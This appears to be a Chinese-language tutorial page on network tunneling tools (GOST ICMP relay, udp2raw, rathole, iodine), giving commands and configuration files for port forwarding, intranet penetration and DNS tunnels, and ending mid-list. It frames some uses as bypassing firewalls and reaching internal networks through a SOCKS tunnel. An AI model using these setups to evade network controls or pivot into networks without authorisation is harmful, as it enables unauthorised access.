<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">服务端</span><br><span class="line"></span><br><span class="line">gost -L relay+<span class="attr">icmp</span>:<span class="comment">//:0</span></span><br><span class="line"></span><br><span class="line">客户端</span><br><span class="line"></span><br><span class="line">gost -L :<span class="number">8080</span> -F <span class="string">&quot;relay+icmp://server_ip:12345?keepalive=true&amp;ttl=10s&quot;</span></span><br><span class="line"></span><br><span class="line">客户端标识</span><br><span class="line"></span><br><span class="line"><span class="variable constant_">ICMP</span>与通常的传输层协议，例如<span class="variable constant_">TCP</span>，<span class="variable constant_">UDP</span>不同，没有端口的概念，但为了区分不同的客户端，需要对客户端进行标识。<span class="variable constant_">GOST</span>中采用<span class="variable constant_">IP</span>+<span class="variable constant_">ID</span>的方式来标识一个客户端，<span class="variable constant_">IP</span>即客户端<span class="variable constant_">IP</span>地址，<span class="variable constant_">ID</span>是<span class="variable constant_">ICMP</span> <span class="title class_">Echo</span>报文中的<span class="title class_">Identifier</span>字段值。</span><br><span class="line"></span><br><span class="line">在客户端可以通过类似于指定端口的方式来指定<span class="variable constant_">ID</span>，例如上面例子中的<span class="number">12345</span>。也可以设置为<span class="number">0</span>，<span class="variable constant_">GOST</span>会自动生成一个随机<span class="variable constant_">ID</span>。对于服务端这个值无效。</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Udp2raw"><a href="#Udp2raw" class="headerlink" title="Udp2raw"></a>Udp2raw</h2><aside>
📖 通过使用原始套接字将UDP流量转换为加密UDP/FakeTCP/ICMP流量的隧道，帮助您绕过UDP防火墙（或不稳定的UDP环境）

</aside>

<blockquote>
<p>安装</p>
</blockquote>
<ul>
<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/wangyu-/udp2raw-tunnel/releases">https://github.com/wangyu-/udp2raw-tunnel/releases</a></li>
</ul>
<blockquote>
<p>使用</p>
</blockquote>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">假设你有一个server，ip为<span class="number">44.55</span><span class="number">.66</span><span class="number">.77</span>，有一个服务监听在udp <span class="number">7777</span>端口。 假设你本地的主机到<span class="number">44.55</span><span class="number">.66</span><span class="number">.77</span>的<span class="variable constant_">UDP</span>流量被屏蔽了，或者被qos了</span><br><span class="line"></span><br><span class="line">在server端运行:</span><br><span class="line">./udp2raw_amd64 -s -l0<span class="number">.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">4096</span>  -r127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">7777</span>   -k <span class="string">&quot;passwd&quot;</span> --raw-mode faketcp   --cipher-mode xor  -a</span><br><span class="line"></span><br><span class="line">在client端运行:</span><br><span class="line">./udp2raw_amd64 -c -l0<span class="number">.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">3333</span>  -r44<span class="number">.55</span><span class="number">.66</span><span class="number">.77</span>:<span class="number">4096</span> -k <span class="string">&quot;passwd&quot;</span> --raw-mode faketcp   --cipher-mode xor  -a</span><br><span class="line"></span><br><span class="line">现在client和server之间建立起了，tunnel。想要在本地连接<span class="number">44.55</span><span class="number">.66</span><span class="number">.77</span>:<span class="number">7777</span>，只需要连接 <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">3333</span>。来回的所有的udp流量会被经过tunneling发送。在外界看起来是tcp流量，不会有udp流量暴露到公网。</span><br><span class="line">--raw-mode 参数可选，<span class="title function_">faketcp</span>(默认)、udp、icmp，根据当前网络情况选择。</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Rathole"><a href="#Rathole" class="headerlink" title="Rathole"></a>Rathole</h2><aside>
📖 安全、稳定、高性能的内网穿透工具，用 Rust 语言编写，类似与frp，ngrok。

</aside>

<blockquote>
<p>特点</p>
</blockquote>
<ul>
<li><strong>高性能</strong> 具有更高的吞吐量，高并发下更稳定。见<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/rapiz1/rathole/blob/main/README-zh.md#benchmark">Benchmark</a></li>
<li><strong>低资源消耗</strong> 内存占用远低于同类工具。见<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/rapiz1/rathole/blob/main/README-zh.md#benchmark">Benchmark</a>。<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/rapiz1/rathole/blob/main/docs/build-guide.md">二进制文件最小</a>可以到 <strong>~500KiB</strong>，可以部署在嵌入式设备如路由器上。</li>
<li><strong>安全性</strong> 每个服务单独强制鉴权。Server 和 Client 负责各自的配置。使用 Noise Protocol 可以简单地配置传输加密，而不需要自签证书。同时也支持 TLS。</li>
<li><strong>热重载</strong> 支持配置文件热重载，动态修改端口转发服务。</li>
</ul>
<blockquote>
<p>功能</p>
</blockquote>
<ul>
<li>内网穿透</li>
<li>端口转发</li>
<li>内网穿透代理隧道，http，socks5</li>
</ul>
<blockquote>
<p>安装</p>
</blockquote>
<ul>
<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/rapiz1/rathole/releases">https://github.com/rapiz1/rathole/releases</a>  选择对应系统架构下载</li>
<li>或者使用包管理器，apt，pacman，brew等等。</li>
</ul>
<blockquote>
<p>配置文件</p>
</blockquote>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">**客户端配置文件**</span><br><span class="line">[client]</span><br><span class="line">remote_addr = <span class="string">&quot;example.com:2333&quot;</span> # 必要。服务器的地址</span><br><span class="line"></span><br><span class="line">default_token = <span class="string">&quot;default_token_if_not_specify&quot;</span> # 可选参数。服务的默认令牌，定义密码(如果它们没有定义自己的令牌)</span><br><span class="line"></span><br><span class="line">heartbeat_timeout = <span class="number">40</span> 设置为<span class="number">0</span>表示关闭应用层心跳测试。必须大于“server.<span class="property">heartbeat_interval</span>”。默认值:<span class="number">40</span>秒，可选</span><br><span class="line"></span><br><span class="line">retry_interval = <span class="number">1</span> # 可选。重试连接到服务器的时间间隔。默认值:<span class="number">1</span>秒</span><br><span class="line"></span><br><span class="line">[client.<span class="property">transport</span>] # 可选，指定传输协议 [<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;tls&quot;</span>, <span class="string">&quot;noise&quot;</span>]. <span class="title class_">Default</span>: <span class="string">&quot;tcp&quot;</span></span><br><span class="line">[client.<span class="property">transport</span>.<span class="property">tcp</span>] # <span class="title class_">Optional</span>. <span class="title class_">Also</span> affects <span class="string">`noise`</span> and <span class="string">`tls`</span></span><br><span class="line"></span><br><span class="line">proxy = <span class="string">&quot;socks5://user:passwd@127.0.0.1:1080&quot;</span> # 可选，设置代理连接服务器</span><br><span class="line"></span><br><span class="line">nodelay = <span class="literal">true</span> # 可选 <span class="string">`client.transport.nodelay`</span> 覆盖服务</span><br><span class="line"></span><br><span class="line">keepalive_secs = <span class="number">20</span> # 可选的。如果适用，请在<span class="title function_">tcp</span>(<span class="number">7</span>)中指定tcp_keepalive_time。默认值:<span class="number">20</span>秒</span><br><span class="line"></span><br><span class="line">keepalive_interval = <span class="number">8</span> #可选的。如果适用，请在<span class="title function_">tcp</span>(<span class="number">7</span>)中指定tcp_keepalive_intvl。默认值:<span class="number">8</span>秒</span><br><span class="line"></span><br><span class="line">[client.<span class="property">transport</span>.<span class="property">tls</span>] # <span class="title class_">Necessary</span> <span class="keyword">if</span> <span class="string">`type`</span> is <span class="string">&quot;tls&quot;</span></span><br><span class="line"></span><br><span class="line">trusted_root = <span class="string">&quot;ca.pem&quot;</span> # ca根证书</span><br><span class="line"></span><br><span class="line">hostname = <span class="string">&quot;example.com&quot;</span> # 可选的。客户端用来验证证书的主机名。如果没有设置，回退到“client.<span class="property">remote_addr</span>”</span><br><span class="line"></span><br><span class="line">[client.<span class="property">transport</span>.<span class="property">noise</span>] # <span class="title class_">Noise</span> protocol. <span class="title class_">See</span> <span class="string">`docs/transport.md`</span> <span class="keyword">for</span> further explanation</span><br><span class="line"></span><br><span class="line">pattern = <span class="string">&quot;Noise_NK_25519_ChaChaPoly_BLAKE2s&quot;</span> # <span class="title class_">Optional</span>. <span class="title class_">Default</span> value <span class="keyword">as</span> shown</span><br><span class="line"></span><br><span class="line">local_private_key = <span class="string">&quot;key_encoded_in_base64&quot;</span> # <span class="title class_">Optional</span></span><br><span class="line"></span><br><span class="line">remote_public_key = <span class="string">&quot;key_encoded_in_base64&quot;</span> # <span class="title class_">Optional</span></span><br><span class="line"></span><br><span class="line">[client.<span class="property">transport</span>.<span class="property">websocket</span>] # <span class="title class_">Necessary</span> <span class="keyword">if</span> <span class="string">`type`</span> is <span class="string">&quot;websocket&quot;</span></span><br><span class="line">tls = <span class="literal">true</span> # 如果为<span class="literal">true</span>,使用 <span class="string">`client.transport.tls`</span></span><br><span class="line"></span><br><span class="line">[client.<span class="property">services</span>.<span class="property">service1</span>] # 需要转发的业务。名称<span class="string">&#x27; service1 &#x27;</span>可以任意更改，只要与服务器配置中的名称相同即可</span><br><span class="line"></span><br><span class="line">type = <span class="string">&quot;tcp&quot;</span> # 可选的。需要转发的协议。可能的值: [<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;udp&quot;</span>]. <span class="title class_">Default</span>: <span class="string">&quot;tcp&quot;</span></span><br><span class="line"></span><br><span class="line">token = <span class="string">&quot;whatever&quot;</span> #  <span class="keyword">if</span> <span class="string">`client.default_token`</span> 没有设置，就必须使用</span><br><span class="line"></span><br><span class="line">local_addr = <span class="string">&quot;127.0.0.1:1081&quot;</span> # 必要的。需要转发的服务的本地ip地址端口</span><br><span class="line"></span><br><span class="line">nodelay = <span class="literal">true</span> # 可选的。确定是否启用<span class="variable constant_">TCP_NODELAY</span>进行数据传输，如果适用，以提高延迟，但减少带宽。默认值:<span class="literal">true</span></span><br><span class="line"></span><br><span class="line">retry_interval = <span class="number">1</span> # 可选的。重试连接到服务器的时间间隔。默认值:继承全局配置</span><br><span class="line"></span><br><span class="line">[client.<span class="property">services</span>.<span class="property">service2</span>] # 可以定义多个服务</span><br><span class="line">local_addr = <span class="string">&quot;127.0.0.1:1082&quot;</span></span><br><span class="line"></span><br><span class="line">**服务端配置文件**</span><br><span class="line">[server]</span><br><span class="line">bind_addr = <span class="string">&quot;0.0.0.0:2333&quot;</span> # 必要的。服务器监听客户端的地址。一般只需要更改端口。</span><br><span class="line"></span><br><span class="line">default_token = <span class="string">&quot;default_token_if_not_specify&quot;</span> # 可选</span><br><span class="line"></span><br><span class="line">heartbeat_interval = <span class="number">30</span> # 可选的。两个应用层心跳的间隔。设置为<span class="number">0</span>表示不发送心跳。默认值:<span class="number">30</span>秒</span><br><span class="line"></span><br><span class="line">[server.<span class="property">transport</span>] # 参考 <span class="string">`[client.transport]`</span></span><br><span class="line">type = <span class="string">&quot;tcp&quot;</span></span><br><span class="line"></span><br><span class="line">[server.<span class="property">transport</span>.<span class="property">tcp</span>] # <span class="title class_">Same</span> <span class="keyword">as</span> the client</span><br><span class="line">nodelay = <span class="literal">true</span></span><br><span class="line">keepalive_secs = <span class="number">20</span></span><br><span class="line">keepalive_interval = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">[server.<span class="property">transport</span>.<span class="property">tls</span>] # 如果<span class="string">&#x27; type &#x27;</span>是<span class="string">&quot;tls&quot;</span>则必需</span><br><span class="line"></span><br><span class="line">pkcs12 = <span class="string">&quot;identify.pfx&quot;</span> # 必要的。服务器证书和私钥的<span class="title class_">Pkcs12</span>文件</span><br><span class="line"></span><br><span class="line">pkcs12_password = <span class="string">&quot;password&quot;</span> # 必要的。pkcs12文件的密码</span><br><span class="line"></span><br><span class="line">[server.<span class="property">transport</span>.<span class="property">noise</span>] # <span class="title class_">Same</span> <span class="keyword">as</span> <span class="string">`[client.transport.noise]`</span></span><br><span class="line"></span><br><span class="line">pattern = <span class="string">&quot;Noise_NK_25519_ChaChaPoly_BLAKE2s&quot;</span></span><br><span class="line"></span><br><span class="line">local_private_key = <span class="string">&quot;key_encoded_in_base64&quot;</span></span><br><span class="line"></span><br><span class="line">remote_public_key = <span class="string">&quot;key_encoded_in_base64&quot;</span></span><br><span class="line"></span><br><span class="line">[server.<span class="property">transport</span>.<span class="property">websocket</span>] # 如果<span class="string">&#x27; type &#x27;</span>是<span class="string">&quot;websocket&quot;</span>则必需</span><br><span class="line">tls = <span class="literal">true</span> # 如果<span class="string">&#x27; true &#x27;</span>，那么它将使用<span class="string">&#x27; server.transport.tls &#x27;</span>中的设置。</span><br><span class="line"></span><br><span class="line">[server.<span class="property">services</span>.<span class="property">service1</span>] # 服务名称必须与客户端相同</span><br><span class="line"></span><br><span class="line">type = <span class="string">&quot;tcp&quot;</span> # <span class="title class_">Optional</span>. <span class="title class_">Same</span> <span class="keyword">as</span> the client <span class="string">`[client.services.X.type]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">token = &quot;whatever&quot; # 如果&#x27; server.default_token &#x27;未设置则必需</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">bind_addr = &quot;0.0.0.0:8081&quot; # 必要的。服务的地址公开在。一般只需要更改端口。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">nodelay = true # 可选的。和客户端一样</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[server.services.service2]</span></span><br><span class="line"><span class="string">bind_addr = &quot;0.0.0.1:8082&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>内网穿透，端口转发，将本地ssh服务转发的远程服务器上</li>
</ul>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># server.<span class="property">toml</span></span><br><span class="line">[server]</span><br><span class="line">bind_addr = <span class="string">&quot;0.0.0.0:2333&quot;</span> # <span class="string">`2333`</span> 配置了服务端监听客户端连接的端口</span><br><span class="line"></span><br><span class="line">[server.<span class="property">services</span>.<span class="property">my_nas_ssh</span>]</span><br><span class="line">token = <span class="string">&quot;use_a_secret_that_only_you_know&quot;</span> # 用于验证的 token</span><br><span class="line">bind_addr = <span class="string">&quot;0.0.0.0:5202&quot;</span> # <span class="string">`5202`</span> 配置了将 <span class="string">`my_nas_ssh`</span> 暴露给互联网的端口</span><br><span class="line"></span><br><span class="line"># client.<span class="property">toml</span></span><br><span class="line">[client]</span><br><span class="line">remote_addr = <span class="string">&quot;myserver.com:2333&quot;</span> # 服务器的地址。端口必须与 <span class="string">`server.bind_addr`</span> 中的端口相同。</span><br><span class="line">[client.<span class="property">services</span>.<span class="property">my_nas_ssh</span>]</span><br><span class="line">token = <span class="string">&quot;use_a_secret_that_only_you_know&quot;</span> # 必须与服务器相同以通过验证</span><br><span class="line">local_addr = <span class="string">&quot;127.0.0.1:22&quot;</span> # 需要被转发的服务的地址</span><br></pre></td></tr></table></figure>

<ul>
<li>配合其他程序建立隧道进行端口转发，通过隧道访问内网</li>
</ul>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># server.<span class="property">toml</span></span><br><span class="line">[server]</span><br><span class="line">bind_addr = <span class="string">&quot;0.0.0.0:2333&quot;</span> # <span class="string">`2333`</span> 配置了服务端监听客户端连接的端口</span><br><span class="line"></span><br><span class="line">[server.<span class="property">services</span>.<span class="property">tunnel</span>]</span><br><span class="line">token = <span class="string">&quot;use_a_secret_that_only_you_know&quot;</span> # 用于验证的 token</span><br><span class="line">bind_addr = <span class="string">&quot;0.0.0.0:5202&quot;</span> # <span class="string">`5202`</span> 配置了将 <span class="string">`tunnel`</span> 暴露给互联网的端口</span><br><span class="line"></span><br><span class="line"># client.<span class="property">toml</span></span><br><span class="line">[client]</span><br><span class="line">remote_addr = <span class="string">&quot;myserver.com:2333&quot;</span> # 服务器的地址。端口必须与 <span class="string">`server.bind_addr`</span> 中的端口相同。</span><br><span class="line">[client.<span class="property">services</span>.<span class="property">my_nas_tunnel</span>]</span><br><span class="line">token = <span class="string">&quot;use_a_secret_that_only_you_know&quot;</span> # 必须与服务器相同以通过验证</span><br><span class="line">local_addr = <span class="string">&quot;127.0.0.1:8090&quot;</span> # 需要被转发的服务的地址</span><br><span class="line"></span><br><span class="line">使用文章中提到glider工具在本地主机上建立socks隧道</span><br><span class="line">glider -listen :<span class="number">8090</span> -verbose</span><br><span class="line">服务端使用上诉配置文件  rathole s.<span class="property">toml</span></span><br><span class="line">客户端使用上诉配置文件进行连接 rathole c.<span class="property">toml</span></span><br><span class="line">连接成功后客户端监听的<span class="number">8090</span>端口的socks 服务器会被转发到服务器端的<span class="number">5202</span>端口。服务器端连接<span class="number">5202</span>端口可以使用客户端上的隧道进行内网访问。如proxychains 中设置socks代理，进行内网穿透隧道访问内网。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>默认情况下， <code>rathole</code>按原样转发流量。  可以启用不同的选项来保护流量。将传输进行加密，使用 noise 进行加密传输</li>
</ul>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">**运行命令，生成密钥，密钥模式**</span><br><span class="line">❯ rathole --genkey</span><br><span class="line"><span class="title class_">Private</span> <span class="title class_">Key</span>:</span><br><span class="line">nfVDW5u1GGzPOCyMNp9P/S9Ytn6JE11lNnEgcx+<span class="title class_">YBsk</span>=</span><br><span class="line"></span><br><span class="line"><span class="title class_">Public</span> <span class="title class_">Key</span>:</span><br><span class="line"><span class="title class_">TyTLNaqaY7</span>lQU418EPpNJpF1nJG46MJPzu3JR+7AekM=</span><br><span class="line"></span><br><span class="line">随后在配置文件中配置以下信息</span><br><span class="line"># <span class="title class_">Client</span> <span class="title class_">Side</span> <span class="title class_">Configuration</span></span><br><span class="line">[client.<span class="property">transport</span>]</span><br><span class="line">type = <span class="string">&quot;noise&quot;</span></span><br><span class="line">[client.<span class="property">transport</span>.<span class="property">noise</span>]</span><br><span class="line">remote_public_key = <span class="string">&quot;GQYTKSbWLBUSZiGfdWPSgek9yoOuaiwGD/GIX8Z1kkE=&quot;</span></span><br><span class="line"></span><br><span class="line"># <span class="title class_">Server</span> <span class="title class_">Side</span> <span class="title class_">Configuration</span></span><br><span class="line">[server.<span class="property">transport</span>]</span><br><span class="line">type = <span class="string">&quot;noise&quot;</span></span><br><span class="line">[server.<span class="property">transport</span>.<span class="property">noise</span>]</span><br><span class="line">local_private_key = <span class="string">&quot;cQ/vwIqNPJZmuM/OikglzBo/+jlYGrOt9i0k5h5vn1Q=&quot;</span></span><br><span class="line"></span><br><span class="line">**无需密钥验证模式</span><br><span class="line">此配置提供流量加密，但不提供身份验证，这意味着它容易受到 <span class="variable constant_">MITM</span> 攻击，但可以抵抗嗅探和重放攻击。 如果 <span class="variable constant_">MITM</span> 攻击不是问题之一，那么使用起来更方便。**</span><br><span class="line"></span><br><span class="line"># <span class="title class_">Server</span> <span class="title class_">Side</span> <span class="title class_">Configuration</span></span><br><span class="line">[server.<span class="property">transport</span>]</span><br><span class="line">type = <span class="string">&quot;noise&quot;</span></span><br><span class="line">[server.<span class="property">transport</span>.<span class="property">noise</span>]</span><br><span class="line">pattern = <span class="string">&quot;Noise_XX_25519_ChaChaPoly_BLAKE2s&quot;</span></span><br><span class="line"></span><br><span class="line"># <span class="title class_">Client</span> <span class="title class_">Side</span> <span class="title class_">Configuration</span></span><br><span class="line">[client.<span class="property">transport</span>]</span><br><span class="line">type = <span class="string">&quot;noise&quot;</span></span><br><span class="line">[client.<span class="property">transport</span>.<span class="property">noise</span>]</span><br><span class="line">pattern = <span class="string">&quot;Noise_XX_25519_ChaChaPoly_BLAKE2s&quot;</span></span><br><span class="line"></span><br><span class="line">**双向认证**</span><br><span class="line"># <span class="title class_">Server</span> <span class="title class_">Side</span> <span class="title class_">Configuration</span></span><br><span class="line">[server.<span class="property">transport</span>]</span><br><span class="line">type = <span class="string">&quot;noise&quot;</span></span><br><span class="line">[server.<span class="property">transport</span>.<span class="property">noise</span>]</span><br><span class="line">pattern = <span class="string">&quot;Noise_KK_25519_ChaChaPoly_BLAKE2s&quot;</span></span><br><span class="line">local_private_key = <span class="string">&quot;server-priv-key-here&quot;</span></span><br><span class="line">remote_public_key = <span class="string">&quot;client-pub-key-here&quot;</span></span><br><span class="line"></span><br><span class="line"># <span class="title class_">Client</span> <span class="title class_">Side</span> <span class="title class_">Configuration</span></span><br><span class="line">[client.<span class="property">transport</span>]</span><br><span class="line">type = <span class="string">&quot;noise&quot;</span></span><br><span class="line">[client.<span class="property">transport</span>.<span class="property">noise</span>]</span><br><span class="line">pattern = <span class="string">&quot;Noise_KK_25519_ChaChaPoly_BLAKE2s&quot;</span></span><br><span class="line">local_private_key = <span class="string">&quot;client-priv-key-here&quot;</span></span><br><span class="line">remote_public_key = <span class="string">&quot;server-pub-key-here&quot;</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="iodine"><a href="#iodine" class="headerlink" title="iodine"></a>iodine</h2><aside>
📖  dns 隧道建立，可以通过dns服务器隧道ipv4数据，可用于绕过网络防火墙

</aside>

<blockquote>
<p>功能</p>
</blockquote>
<ul>
<li>建立 DNS 隧道</li>
<li>绕过网络防火墙封锁</li>
</ul>
<blockquote>
<p>安装</p>
</blockquote>
<ul>
<li>项目地址：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/yarrick/iodine">https://github.com/yarrick/iodine</a></li>
</ul>
<blockquote>
<p>使用</p>
</blockquote>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">环境：公网服务器，域名</span><br><span class="line">设置域名解析，添加A记录指向公网服务器</span><br><span class="line">添加<span class="variable constant_">NS</span>记录指向A记录</span><br><span class="line"></span><br><span class="line">服务端：sudo iodined -f -c -P passwd <span class="number">192.168</span><span class="number">.11</span><span class="number">.1</span> ns1.<span class="property">domain</span>.<span class="property">com</span> -<span class="variable constant_">DD</span>   </span><br><span class="line">-f 前台运行</span><br><span class="line">-c 在每个请求时禁用检查客户端<span class="variable constant_">IP</span>/端口</span><br><span class="line">-P 指定密码</span><br><span class="line">-D 指定调试级别，<span class="variable constant_">DD</span>,<span class="variable constant_">DDD</span>。</span><br><span class="line"></span><br><span class="line">客户端：sudo iodine -f -r  -P passwd ns1.<span class="property">domain</span>.<span class="property">com</span></span><br><span class="line">-f 前台运行</span><br><span class="line">-r 强制dns隧道</span><br><span class="line">-P 指定密码</span><br><span class="line"></span><br><span class="line">执行后会使用虚拟网卡tun/tap建立dns隧道。</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参数详解</p>
</blockquote>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">**iodined 服务端：**</span><br><span class="line">-v打印版本信息并退出</span><br><span class="line"></span><br><span class="line">-h打印帮助并退出</span><br><span class="line"></span><br><span class="line">-<span class="number">4</span>只监听<span class="title class_">IPv4</span></span><br><span class="line"></span><br><span class="line">-<span class="number">6</span>只监听<span class="title class_">IPv6</span></span><br><span class="line"></span><br><span class="line">-c在每个请求时禁用检查客户端<span class="variable constant_">IP</span>/端口</span><br><span class="line"></span><br><span class="line">-s跳过创建和配置tun设备;然后必须手动创建</span><br><span class="line"></span><br><span 